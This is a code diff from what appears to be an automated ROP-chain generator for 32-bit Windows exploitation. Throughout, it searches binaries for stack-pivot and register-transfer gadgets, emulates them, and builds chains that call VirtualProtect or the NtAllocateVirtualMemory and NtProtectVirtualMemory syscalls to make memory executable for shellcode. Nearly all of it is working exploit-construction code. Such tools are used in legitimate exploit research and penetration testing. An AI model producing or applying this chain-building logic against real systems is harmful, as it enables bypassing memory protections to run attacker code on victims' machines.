@@ -7219,13 +7495,15 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 				# if len(oldPk)!=len(curPk) + newSize and xy > 2:
 				# 	curPk=curPk[:-newSize]  #hardcoded for 2  to remove - may need to be updated as gets more advanced
 				oldDESP2=distFinalESP
-				
+
 				distFinalESP,apiReached=getDistanceParamReg(pe,n,curPk,distEsp,IncDec,numP,targetP, "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter   "winApi"
 				oldDESP=distFinalESP
-				# print ("distFinalESP2", hex(distFinalESP))
+				# print ("distFinalESP", hex(distFinalESP))
 				dp ("right after functions ends")
 				if apiReached:
 					stopDistanceEmu=True
+					# print ("return true0a")
+
 					return True, test2,test2b,test2c,distFinalESP,bYes,oldDESP
 				if not recurs:
 					prevDistFinalESP=distFinalESP#-8
@@ -7240,21 +7518,23 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 				# showChain(curPk)
 				dp ("***************in the recurs id", iD, "xy", xy)
 				# dp ("curPk view-->new recurse")
-				dp("distFinalESP", hex(distFinalESP), hex(oldDESP),hex(oldDESP2), xy)
-				if xy < upperLimit and oldDESP !=0:
-					xy+=1
+				# print("distFinalESP", hex(distFinalESP), hex(oldDESP),hex(oldDESP2), xy)
+				if xy < upperLimit and oldDESP !=0 and distFinalESP !=0:
 
-					# AddToESP = giveBoolAddToESP()
-					# while distFinalESP in addEspAttempts:
-					# 	if AddToESP:
-					# 		print ("oh, we already tried ", hex(distFinalESP), "so let's add 4")
-					# 		distFinalESP=distFinalESP+4
-					# 	else:
-					# 		print ("oh, we already tried ", hex(distFinalESP), "so let's subtract 4")
-					# 		distFinalESP=distFinalESP-4
-					# 	if distFinalESP==0:
-					# 		break
-					# print ("final distFinalESP3", hex(distFinalESP))
+					### this used to help, but with new changes, it probably is not going to make a difference. if the distFinalESP is not found through the other method - which searches through memory to find it - then this likely will be of no help. Still, it is kept, just in case.
+					xy+=1
+					if targetP=="sysInvoke":
+						AddToESP = giveBoolAddToESP()
+						while distFinalESP in addEspAttempts:
+							if AddToESP:
+								# print ("oh, we already tried ", hex(distFinalESP), "so let's add 4")
+								distFinalESP=distFinalESP+4
+							else:
+								# print ("oh, we already tried ", hex(distFinalESP), "so let's subtract 4")
+								distFinalESP=distFinalESP-4
+							if distFinalESP==0:
+								break
+						# print ("final distFinalESP3", hex(distFinalESP))
 					addEspAttempts.add(distFinalESP)
 					foundAdd, test2,test2b,test2c,dEsp,bYes,oldDESP = findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP, sysTarget,PWinApi,True,2)
 					dp ("oh ok2", hex(dEsp), hex(oldDESP), "id", iD)
@@ -7263,17 +7543,19 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 						continue
 					if stopDistanceEmu:
 						dp ("stop loc2")
-						showChain(test2)
+						# showChain(test2)
+						# print ("return true0")
 						return foundAdd, test2,test2b,test2c,dEsp,bYes,oldDESP
 					if (foundAdd and oldDESP)==0 or (foundAdd and dEsp==0):
 						dp ("returning foundAdd", foundAdd, "id", iD)
 						bYes=True
 						dp ("do test2 testb")
 						# print (test2, test2b, test2c)
-						showChain(test2)
+						# showChain(test2,True)
 						showChain(test2b)
 						showChain(test2c)
-						return True, test2,test2b,test2c,distFinalESP,bYes,oldDESP
+						# print ("return true1")
+						return False, test2,test2b,test2c,distFinalESP,bYes,oldDESP
 					else:
 						dp ("not foundAdd", foundAdd, "id", iD)
 						continue
@@ -7285,15 +7567,17 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 					showChain(test2)
 					showChain(test2b)
 					showChain(test2c)
-					return True, test2,test2b,test2c,distFinalESP,bYes,oldDESP
+					# print ("apiReached", apiReached, "oldDESP",oldDESP)
+					# print ("return true2")
+					return False, test2,test2b,test2c,distFinalESP,bYes,oldDESP
 			else:
 				dp ("***************ending else")
 				xy=0
 				dp ("do test2 testb 3")
-				showChain(test2)
+				# showChain(test2,True)
 				showChain(test2b)
 				showChain(test2c)
-				return True, test2,test2b,test2c,distFinalESP,bYes,oldDESP
+				return False, test2,test2b,test2c,distFinalESP,bYes,oldDESP
 		t+=1
 	if foundAdd:
 		dp ("do test2 testb 4")
@@ -7343,10 +7627,9 @@ def findXchgMovRegSpecial(reg1, bad,length1,excludeRegs,espDesiredMovement):
 	else:
 		# dp ("return false ", instruction)
 		return False,0,0
-def getPushPopESP(reg,excludeRegs,espDesiredMovement, getSpecificReg=True):
-	# do excluded regs
+def getPushPopESP(reg,excludeRegs,espDesiredMovement,regMatch, c3Only, comment=True):
+	# print(gre,"getPushPopESP",reg,res)
 	instruction="push"
-	# excludeRegs=["ebx"]
 	excludeRegsSet=set(excludeRegs)
 	bExists, myDict=fg.getFg(instruction,"esp")
 	stackPivotAmount=0
@@ -7357,10 +7640,11 @@ def getPushPopESP(reg,excludeRegs,espDesiredMovement, getSpecificReg=True):
 			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
 			out =disOffset(p)
 			out+=""
-			# out="push esp # mov eax, edi # pop edi # add edi, 0x4 # pop esi # ret"
-			if re.search( r'^pop [fg]* | pop es ', out, re.M|re.I):
+			if not myDict[p].opcode=="c3" and c3Only:
 				continue
-			if "pop" in out and  "[" not in out and  "add esp" not in out and  "sub esp" not in out and  "adc esp" not in out and  "sbb esp" not in out and not "div" in out and not "leave" in out:
+			if re.search( r'^pop [fg]* | pop es ', out, re.M|re.I) or not freeBad:
+				continue
+			if "pop" in out and  "[" not in out and  "add esp" not in out and  "sub esp" not in out and  "adc esp" not in out and  "sbb esp" not in out and not "div" in out and not "leave" in out and "mov esp" not in out and "fdiv" not in out:
 				pushInstances = re.findall('push', out)
 				if len((pushInstances))>1:
 					# print ("continueFlag1")
@@ -7381,8 +7665,11 @@ def getPushPopESP(reg,excludeRegs,espDesiredMovement, getSpecificReg=True):
 					continue
 				transferReg=popInstances[0].split("pop ")
 				newReg=transferReg[1]
-				if getSpecificReg:
-					if reg!=newReg:
+
+				if newReg in excludeRegs:
+					continue
+				if regMatch:
+					if newReg!=reg:
 						continueFlag=True
 				if continueFlag:
 					# print (cya,out,res)
@@ -7395,101 +7682,126 @@ def getPushPopESP(reg,excludeRegs,espDesiredMovement, getSpecificReg=True):
 					# print ("it gets clobbered!", checkForClobber[1])
 					# print ("continueFlag3")
 					continue
-				c2Amt=0
-				c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
-				if c2Search:
-					# print ("c2Search:", c2Search)
-					c2Ret=c2Search[0].split("ret ")
-					# print ("c2Ret:", c2Ret)
-					try:
-						c2Amt=int(c2Ret[1],16)
-					except:
-						c2Amt=int(c2Ret[1])
-				stackPivotAmount=(len(popInstances)-1)*4 +c2Amt
-				modulo=stackPivotAmount % 4
-				if modulo!=0:
-					continue
-				# print (red+"\n--> possible",res)
-				# print ("transferReg",transferReg[1], "stackPivotAmount", stackPivotAmount, hex(stackPivotAmount))
-				# print (out)
-				return True, p, newReg, stackPivotAmount
-	return False, 0,0,0
-
-
-def getPushPopReg(reg, reg2,excludeRegs,espDesiredMovement, getSpecificReg=True):
-	# do excluded regs
-	# print ("getPushPopReg",reg,reg2)
-	instruction="push"
-	# excludeRegs=["ebx"]
-	excludeRegsSet=set(excludeRegs)
-	bExists, myDict=fg.getFg(instruction,reg)
-	stackPivotAmount=0
-	newReg=None
-	transferReg=None
-	if bExists:
-		for p in myDict:
-
-			newTransferReg=None
-			continueFlag=False
-			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
-			out =disOffset(p)
-			out+=""
-			# print ("---", out)
-			# out="push esp # mov eax, edi # pop edi # add edi, 0x4 # pop esi # ret"
-			if re.search( r'^pop [fg]* | pop es ', out, re.M|re.I):
-				continue
-			if "pop " in out and  "[" not in out and  "add esp" not in out and  "sub esp" not in out and  "adc esp" not in out and  "sbb esp" not in out and not "leave" in out:
-				pushInstances = re.findall('push', out)
-				if len((pushInstances))>1:
-					# print ("continueFlag1")
-					continue
-				popInstances = re.findall('pop [\w]+', out)
-				t=0
-				for pReg in popInstances:
-					test=pReg.split("pop ")
-					# print (test)
-					if t==0:
-						newTransferReg=test[1]
-						# print ("   newTransferReg:", newTransferReg)
-						if not newTransferReg==reg2:
-							continueFlag=True
-					if t>0:
-						if test[1] in excludeRegsSet:
-							# print (yel+"got a bad one", excludeRegsSet, res)
-							continueFlag=True
-					t+=1
-				if continueFlag:
-					# print ("continueFlag2")
-					continue
-				# print (cya,out,res)
-
 				outEmObj=rop_tester(myDict[p].raw, hex(p)+"  2")
 				# outEmObj.show()
 				
-				checkedFree, stackPivotAmount= outEmObj.checkFree(excludeRegs,[newTransferReg])
-				if checkedFree:
-					if reg != reg2:
-						# print (blu)
-						if outEmObj.verifyValSame(reg,newTransferReg):
-							# print (cya,out,res)
-							# print (red)
-							# outEmObj.show()
-							# print(res)
-							c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
-							c2Amt=0
-							if c2Search:
-								# print ("c2Search:", c2Search)
-								c2Ret=c2Search[0].split("ret ")
-								# print ("c2Ret:", c2Ret)
-								try:
-									c2Amt=int(c2Ret[1],16)
-								except:
-									c2Amt=int(c2Ret[1])
-							# print ("stackPivotAmount", stackPivotAmount+c2Amt)
-							stackPivotAmount=stackPivotAmount+c2Amt
-							# print (res)
-							return True, p, stackPivotAmount
-	return False, 0,0
+				checkedFree, stackPivotAmount= outEmObj.checkFree(excludeRegs,[newReg])
+				if not checkedFree:
+					continue
+					
+				if 2==2:
+					c2Amt=0
+					c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
+					if c2Search:
+						# print ("c2Search:", c2Search)
+						c2Ret=c2Search[0].split("ret ")
+						# print ("c2Ret:", c2Ret)
+						try:
+							c2Amt=int(c2Ret[1],16)
+						except:
+							c2Amt=int(c2Ret[1])
+				if c2Amt!=0:
+					modulo=c2Amt % 4
+					if modulo!=0:
+						continueFlag=True
+				if continueFlag:
+					continue
+				# print (red+"\n--> possible",res)
+				# print ("transferReg",transferReg[1], "stackPivotAmount", stackPivotAmount, hex(stackPivotAmount))
+			
+				# print (cya, hex(p), res, out, yel,"newReg", newReg,mag, reg, stackPivotAmount)
+				return True, p, newReg, stackPivotAmount,myDict[p].opcode,c2Amt
+	return False, 0,0,0,0,0
+
+rC=0
+def checkRopTester():
+	global rC
+	if rC==25:
+		doGC()
+		rC=0
+		
+	# Emulation run a certain number of times in succession can cause it to crash. We have to manually do garbage collection to overcome this issue.
+	
+def getPushPopReg(reg, reg2,excludeRegs,espDesiredMovement,regMatch=True, c3Only=True,notESP=True ):
+	# print ("getPushPopReg")
+	global rC
+	try:
+		# do excluded regs
+		# print ("getPushPopReg",reg,reg2)
+		instruction="push"
+		# excludeRegs=["ebx"]
+		excludeRegsSet=set(excludeRegs)
+		bExists, myDict=fg.getFg(instruction,reg)
+		stackPivotAmount=0
+		newReg=None
+		transferReg=None
+		if bExists:
+			for p in myDict:
+				checkRopTester()
+				newTransferReg=None
+				continueFlag=False
+				if not myDict[p].opcode=="c3" and c3Only:
+					continue
+				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
+				out =disOffset(p)
+				out+=""
+				# print ("---", out)
+				# out="push esp # mov eax, edi # pop edi # add edi, 0x4 # pop esi # ret"
+				if re.search( r'^pop [fg]* | pop es ', out, re.M|re.I) or not freeBad:
+					continue
+				if "pop " in out and  "[" not in out and  "add esp" not in out and  "sub esp" not in out and  "adc esp" not in out and  "sbb esp" not in out and not "leave" in out and "mov esp" not in out and "xchg esp" not in out and "fdiv" not in out:
+					pushInstances = re.findall('push', out)
+					if len((pushInstances))>1:
+						# print ("continueFlag1")
+						continue
+					popInstances = re.findall('pop [\w]+', out)
+					t=0
+					for pReg in popInstances:
+						test=pReg.split("pop ")
+						if t==0:
+							newTransferReg=test[1]
+							# print ("   newTransferReg:", newTransferReg)
+							if regMatch:
+								if newTransferReg!=reg2:
+									continueFlag=True
+						if t>0:
+							if test[1] in excludeRegsSet:
+								continueFlag=True
+						t+=1
+					if notESP and newTransferReg=="esp":
+						continue
+					if continueFlag:
+						continue
+					rC+=1
+					outEmObj=rop_tester(myDict[p].raw, hex(p)+"  2")
+					checkedFree, stackPivotAmount= outEmObj.checkFree(excludeRegs,[newTransferReg])
+					c2Amt=0
+					if checkedFree and not continueFlag:
+						if reg != reg2 and reg != newTransferReg:
+							if outEmObj.verifyValSame(reg,newTransferReg):
+								# print (cya,out,res)
+								# print (red)
+								# outEmObj.show()
+								# print(res)
+								c2Search=re.findall('ret 0x[0-9a-f]+|ret \d', out)
+								if c2Search:
+									c2Ret=c2Search[0].split("ret ")
+									try:
+										c2Amt=int(c2Ret[1],16)
+									except:
+										c2Amt=int(c2Ret[1])
+								if c2Amt!=0:
+									modulo=c2Amt % 4
+									if modulo!=0:
+										continueFlag=True
+								return True, p, newTransferReg, stackPivotAmount,myDict[p].opcode,c2Amt
+				if continueFlag:
+					continue
+		return False, 0,0,0,0,0
+	except Exception as e:
+		dp  ("oh no")
+		dp (e)
+		dp (traceback.format_exc())
 
 def findMovRegSpecial(reg1, bad,length1,excludeRegs,espDesiredMovement):
 	#reg 1 - the one we want
@@ -7550,54 +7862,86 @@ def genFiller(fillerAmt):
 	for x in range(need):
 		fillers.append(0x41414141)		
 	return fillers
+def findStackPivot(reg,bad,length1, excludeRegs,regsNotUsed,comment):
+	espDesiredMovement=0
+	foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs,espDesiredMovement)
+	if foundMEsp:
+		cMEsp=chainObj(mEsp, "Save esp to "+reg+" - " + comment, [])
+	if not foundMEsp:
+		foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs,espDesiredMovement,True,True,comment)
+		if foundMEsp:
+			if stackPivotAmount ==0:
+				cMEsp=chainObj(mEsp,  "Save esp to "+reg + " - " + comment, [])
+			else:
+				filler=genFiller(stackPivotAmount)
+				cMEsp=chainObj(mEsp,  "Save esp to "+reg + " - " + comment, filler)		
+	if not foundMEsp:
+		# print ("continue foundMEsp2")
+		return False,0
+	if  foundMEsp:
+		package=pkBuild([cMEsp])
+		showChain(package)
+		return True, package
 
 def findMovDerefGetStack(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distEsp):
 	dp ("***regsNotUsed", regsNotUsed)
-	for op2 in regsNotUsed:
-		excludeRegs2= copy.deepcopy(excludeRegs)
-		excludeRegs2.append(op2)
-		foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs2,distEsp)
-		if not foundL1:
-			dp ("continue p2")
-			continue
-		foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs2,espDesiredMovement)
-		if foundMEsp:
-			cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
-		if not foundMEsp:
-		# if 1==1:
-			# foundT, mEsp = xchgMovReg("esp",reg, bad,length1,excludeRegs2,espDesiredMovement)
-			# 	cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
-			# if not foundT:				
-			# foundT, mEsp,newReg = findMovRegSpecial("esp", bad,length1,excludeRegs2,espDesiredMovement)
-			# print ("continue mEsp")
-			foundMEsp, mEsp,newReg, stackPivotAmount = getPushPopESP(reg,excludeRegs2,espDesiredMovement)
+	try:
+		for op2 in regsNotUsed:
+			excludeRegs2= copy.deepcopy(excludeRegs)
+			excludeRegs2.append(op2)
+			foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs2,distEsp)
+			if not foundL1:
+				dp ("continue p2")
+				continue
+			foundMEsp, mEsp = findMovEsp(reg,bad,length1, excludeRegs2,espDesiredMovement)
 			if foundMEsp:
-				if stackPivotAmount ==0:
-					cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
-				else:
-					filler=genFiller(stackPivotAmount)
-					cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
-				# showChain(pkBuild([cMEsp]),True)
-				# print ("stackPivotAmount", stackPivotAmount)
-				# print ("regsNotUsed", regsNotUsed)
-				# print ("excludeRegs2", excludeRegs2)
-				# home
-		if not foundMEsp:
-			dp ("continue foundMEsp2")
-			continue
-		foundAdd, a1 = findGenericOp2("add", op2,reg,bad,length1, excludeRegs2,espDesiredMovement)
-		if not foundAdd:
-			dp ("continue a1")
-			continue
-		if foundL1 and foundAdd and foundMEsp:
-			# cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
-			cA=chainObj(a1, "Adjust " +reg +" to parameter ", [])
-			
-			package=pkBuild([cMEsp,chP,cA])
-			showChain(package)
-			return True, package
-	dp ("findMovDerefGetStack return false")
-	return False, -0x666
+				cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
+			if not foundMEsp:
+				foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs2,espDesiredMovement,True,True)
+				if foundMEsp:
+					if stackPivotAmount ==0:
+						cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
+					else:
+						filler=genFiller(stackPivotAmount)
+						cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
+				if not foundMEsp:
+					foundMEsp, mEsp,newReg, stackPivotAmount,c3Status,c2Adjust = getPushPopESP(reg,excludeRegs2,espDesiredMovement,False,False)
+				if foundMEsp:
+					# cMEsp=chainObj(0x56ee7f,  "Save esp to "+reg, [0xdeadc0de,0xdeadc0de])
+					foundT4, gT4 = findUniTransfer(reg,newReg, bad,length1,excludeRegs2,0, "Transfer to " + reg)
+					if foundT4:
+						filler2=[]
+						if stackPivotAmount ==0:
+							cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
+							if c3Status!="c3":
+								cMEsp=chainObj(mEsp,  "Save esp to "+reg,[])
+								filler2=genFiller(c2Adjust)
+								gT4[0].modStackAddFirst(filler2)
+						else:
+							filler=genFiller(stackPivotAmount)
+							cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
+							if c3Status!="c3": #now
+								filler2=genFiller(c2Adjust)
+								gT4[0].modStackAddFirst(filler2)
+						cMEsp=pkBuild([cMEsp,gT4])
+			if not foundMEsp:
+				# print ("continue foundMEsp2")
+				continue
+			foundAdd, a1 = findGenericOp2("add", op2,reg,bad,length1, excludeRegs2,espDesiredMovement)
+			if not foundAdd:
+				# print ("continue a1")
+				continue
+			if foundL1 and foundAdd and foundMEsp:
+				# cMEsp=chainObj(mEsp, "Save esp to "+reg, [])
+				cA=chainObj(a1, "Adjust " +reg +" to parameter ", [])
+				package=pkBuild([cMEsp,chP,cA])
+				return True, package
+		# print ("findMovDerefGetStack return false")
+		return False, -0x666
+	except Exception as e:
+		print ("exception 2", sysTarget)
+		print(e)
+		print(traceback.format_exc())
 
 
 def findMovDerefGetStackNotReg(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distEsp):
@@ -7675,7 +8019,7 @@ def buildLPWinAPI(orgOp2,derefReg, bad,length1, excludeRegs,regsNotUsed,espDesir
 	##### try the mov first -- may have to try others!!!
 	
 	foundL1, p2, gP = loadReg(orgOp2,bad,length1,excludeRegs,pVP,comment)
-	foundM1, m2 = findMovDeref2(orgOp2,orgOp2,bad,length1, excludeRegs,espDesiredMovement)
+	foundM1, m2 = findMovDeref2Old(orgOp2,orgOp2,bad,length1, excludeRegs,espDesiredMovement)
 	dp ("foundM1", foundM1)
 	# foundL1=False
 	if foundM1 and foundL1:
@@ -7685,14 +8029,14 @@ def buildLPWinAPI(orgOp2,derefReg, bad,length1, excludeRegs,regsNotUsed,espDesir
 		package.append(gMd)
 		package=pkBuild([package])
 		dp ("vp show")
-		showChain(package)
+		# showChain(package)
 		return True,package
 
 	### reg not available - we will need to do something else and then switch
 	regsNotUsed.remove(orgOp2)
 	excludeRegs2,regsNotUsed2= regsAvailtoExclude(regsNotUsed,excludeRegs)
 
-	for op2 in regsNotUsed:
+	for op2 in regsNotUsed2:
 		foundL1, p2, gP = loadReg(op2,bad,length1,excludeRegs2,pVP)
 		if not foundL1:
 			dp ("continue p2")
@@ -7712,7 +8056,7 @@ def buildLPWinAPI(orgOp2,derefReg, bad,length1, excludeRegs,regsNotUsed,espDesir
 			package=[gP,gM2]
 			package.extend(gT)
 			package.append(gMd2)
-			showChain(package)
+			# showChain(package)
 			package=pkBuild([package])
 			return True,package
 		else:
@@ -7892,7 +8236,7 @@ def helperMovDeref(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,val,comme
 	else:
 		return False,0
 
-def getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement, curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName):
+def getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement, curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName,excludeRegs):
 	dp ("getSyscallSetup func", "numP", numP, "distEsp", hex(distEsp))
 	sysName=SyscallName[0]
 	syscallSSN=SyscallName[1]
@@ -7922,6 +8266,8 @@ def getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement, curPk,s
 		excludeRegs2,regsNotUsed2= regsAvailtoExclude(regsNotUsed,excludeRegs)
 		tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
 		foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs2,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis)
+		# foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs2,(sysTarget)," Ptr to way of invoking syscall, "+tryThis)
+
 		pkLoadSys=pkBuild([chP])
 
 		sysStyle="pushDword"
@@ -8485,25 +8831,83 @@ def addToBase(imgBase, imgSize):
 
 
 def genBasesForEm():
+	genBasesForEmNew()
+	if 2==3:
+		# return
+		dp ("genBasesForEm")
+		baseImg=0x300000
+		prevSize=0
+		t=0
+		for img in pe:
+			if len(pe[img].data) > 1:
+				imgSize=len(pe[img].data)
+				# dp ("size:",hex(imgSize),img)
+				if t==0:		
+					pe[img].emBase=baseImg
+					# dp ("\tbaseImg:", hex(baseImg), img)
+					prevSize=imgSize
+				else:
+					baseImg=addToBase(baseImg,prevSize)
+					pe[img].emBase=baseImg
+					prevSize=imgSize
+					# dp ("\tbaseImg:", hex(baseImg), img)
+				t+=1
+		# dp("\n\n")
+
+def genBasesForEmNew():
+	# return
 	dp ("genBasesForEm")
 	baseImg=0x300000
+	baseDLL=0x2005000
 	prevSize=0
 	t=0
+	curAddresses=[]
+	# curAddresses.append((0x6fc31000, 0x6fc32000,"ghost"))
 	for img in pe:
+		badFlag=False
 		if len(pe[img].data) > 1:
-			imgSize=len(pe[img].data)
+			imgSize=len(pe[img].data)+0x4000
 			# dp ("size:",hex(imgSize),img)
+			# print(cya,img, res,hex(pe[img].startLoc),hex(pe[img].startLoc+imgSize) )
 			if t==0:		
-				pe[img].emBase=baseImg
+				# pe[img].emBase=baseImg
+				# print ("emBase",hex(pe[img].emBase))
+				pe[img].emBase=pe[img].startLoc
+				# print("startLoc",hex(pe[img].startLoc))
 				# dp ("\tbaseImg:", hex(baseImg), img)
+				# print ("emBase",hex(pe[img].emBase))
+
 				prevSize=imgSize
 			else:
-				baseImg=addToBase(baseImg,prevSize)
-				pe[img].emBase=baseImg
-				prevSize=imgSize
-				# dp ("\tbaseImg:", hex(baseImg), img)
+				for e in curAddresses:
+					if pe[img].startLoc >= e[0] and pe[img].startLoc <= e[1]:
+						# print("bad1", img, e[2])
+						badFlag=True
+					if pe[img].startLoc+imgSize >= e[0] and pe[img].startLoc+imgSize <= e[1]:
+						# print("bad2", img, e[2])
+						badFlag=True
+					if e[0] >= pe[img].startLoc and e[0]<= pe[img].startLoc+imgSize: 
+						# print("bad3", img, e[2])
+						badFlag=True
+					if e[1] >= pe[img].startLoc and e[1] <= pe[img].startLoc +imgSize:
+						# print("bad4", img, e[2])
+						badFlag=True
+				if pe[img].systemWin:
+					badFlag=True
+				baseDLL=addToBase(baseDLL,prevSize)
+				# pe[img].emBase=baseImg #old way
+				if not badFlag:
+					baseImg=pe[img].startLoc
+					pe[img].emBase=baseImg #old way
+				else:
+					baseImg=baseDLL
+					pe[img].emBase=baseImg #old way
+				curAddresses.append((baseImg, baseImg+imgSize,img))
+				prevSize=imgSize				
 			t+=1
-	# dp("\n\n")
+
+	# for img in pe:
+		# print(yel,img, res,hex(pe[img].emBase),hex(pe[img].emBase+imgSize) )
 
 def genStackForRopChain(gList):
 	ch=b""
@@ -8733,6 +9137,8 @@ def buildMovDerefSyscall(excludeRegs,bad, myArgs ,numArgs):
 	dp ("buildMovDerefSyscall")
 	dp ("excludeRegs",excludeRegs, "bad", bad)
 	SyscallName=(("NtAllocateVirtualMemory",0x18))
+	# genBasesForEmNew()
+	clearGlobals()
 	global PWinApi
 	sizeForPtr=myArgs[8]
 	protect=myArgs[7]        #6
@@ -8832,7 +9238,7 @@ def buildMovDerefSyscall(excludeRegs,bad, myArgs ,numArgs):
 		foundStart, pkStart=findMovDerefGetStack(reg,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,distEsp)
 		if foundStart:
 			curPk=pkBuild([pkStart,pkZBA,gT,pkVRSforPtr,pkP6, pkP5,gT2,pkP4,pkP3,gT2,pkInc,pkP2, pkP1,pkRA1,pkRA2])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
-			foundSys, pkSysSetup=getSyscallSetup(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName)
+			foundSys, pkSysSetup=getSyscallSetup(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName,excludeRegs2)
 
 		if foundStart and foundSys:
 			pk=pkBuild([pkStart,pkZBA,gT,pkVRSforPtr,pkP6, pkP5,gT2,pkP4,pkP3,gT2,pkInc,pkP2, pkP1,pkRA1,pkRA2,pkSysSetup])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
@@ -8852,7 +9258,10 @@ def buildMovDerefSyscallProtect(excludeRegs,bad, myArgs ,numArgs):
 	dp ("buildMovDerefSyscallProtect",myArgs)
 	dp ("excludeRegs",excludeRegs,	 "bad", bad)
 	SyscallName=(("NtProtectVirtualMemory",0x4a))
+	clearGlobals()
+	outFile.write("The below is for Windows Syscall NtProtectVitualMemory:\n")
 
+	# genBasesForEmNew()
 	global PWinApi
 	OldAccessPr=myArgs[6] #5
 	NewAccessProt=myArgs[5]     #4
@@ -8866,8 +9275,8 @@ def buildMovDerefSyscallProtect(excludeRegs,bad, myArgs ,numArgs):
 	dp ("myArgs2", myArgs)
 	dp("NumberBytesProtect",NumberBytesProtect)
 
-	distEsp=0x300  # distance to start of parameters  - user input
-	distEsp2=0x300
+	distEsp=0x500  # distance to start of parameters  - user input
+	distEsp2=0x500
 	distParam=0x55 # distance to lp parameter    - dynamically generated  possibly via emulation?  how has the stack changed since that point in time--run all gadgets previous to this in emulation to determine the offset needed.
 	distFinalESP=0x34  # distance to esp at end - dynamically generated. This is just a starting point - emulation will correct to the actual value.
 	numP=6
@@ -8970,7 +9379,7 @@ def buildMovDerefSyscallProtect(excludeRegs,bad, myArgs ,numArgs):
 				if not foundMovderef:
 					continue
 				if foundMovderef:
-					foundSys, pkSysSetup=getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName)
+					foundSys, pkSysSetup=getSyscallSetup(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName,excludeRegs2)
 
 				if foundStart and foundSys:
 					pk=pkBuild([pkStart,gTbase,pkBA,pkNBforPtr,gT1, gT3,pkP5,pkP4,pkP3,pkP2,pkP1,pkRA1,pkRA2,pkSysSetup])
@@ -9002,7 +9411,10 @@ def get_VirtualProtectPTR():
 			True,vp,"Simulated value-VirtualProtect ptr not found!"
 		return False,vp,"VirtualProtect not Found"	
 
-def buildMovDeref(excludeRegs,bad, myArgs ,numArgs):
+def buildMovDeref(bad, myArgs ,numArgs):
+	clearGlobals()
+	outFile.write("The below is for API VirtualProtect\n")
+	excludeRegs=[]
 	global PWinApi
 	plpflOldProtect=myArgs[5]
 	plfNewProtect=myArgs[4]
@@ -9097,29 +9509,20 @@ def buildMovDeref(excludeRegs,bad, myArgs ,numArgs):
 		if foundVP:
 			dp ("have pointer to VirtualProtect")
 			# print ("have pointer to VirtualProtect")
-
-
 		if not foundLR:
 			dp ("not foundLR continue")
 			# print ("not foundLR continue")
-
-
 			continue
 		if not foundVP:
 			dp ("not foundvp continue")
 			# print ("not foundvp continue")
-
-
 			continue
-
 		#pattern 2
 		# curPk=pkBuild([pkStart,pkFlOld,pkFn,pkLP, pkRA,pkVP])
 		curPk=pkBuild([pkStart,pkFlOld,pkFn,pkDW,pkLP,pkRA,pkVP]) #pkFn,pkDW
-
 		dp ("before findChangeESP", "foundStart", foundStart, "foundVP", foundVP, "foundMovderef", foundMovderef)
 		if foundStart and foundVP and foundMovderef:
 			dp ("after findChangeESP", "foundStart", foundStart, "foundVP", foundVP, "foundMovderef", foundMovderef)
-
 			compensate=0
